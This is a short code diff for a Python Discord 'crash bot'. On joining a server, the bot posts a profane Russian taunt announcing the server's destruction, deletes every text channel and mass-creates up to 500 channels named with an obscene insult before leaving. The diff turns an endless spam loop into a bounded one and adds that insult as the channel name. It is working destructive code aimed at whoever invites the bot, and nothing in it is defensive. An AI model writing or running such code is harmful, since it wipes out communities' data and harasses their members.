@@ -8,6 +8,7 @@ token = os.environ.get('TOKENZ')
 class MyClient(discord.Client):
     async def on_guild_join(self, guild):
         a = 0
+        c = 0
         for i in guild.text_channels:
             if a == 0:
                 await i.send('Привет! Спасибо, что добавили ахуенного краш-бота! Вашему серверу придёт пиздец через 3 секунды. Удачи :D')
@@ -20,8 +21,9 @@ class MyClient(discord.Client):
             await i.delete()
             print('Канал', i, 'удалён!')
 
-        while True:
-            await guild.create_text_channel(name='66666666666666666666')
+        while c < 500:
+            await guild.create_text_channel(name='сосите хуй )))')
+            c += 1
         await guild.leave()
 
 
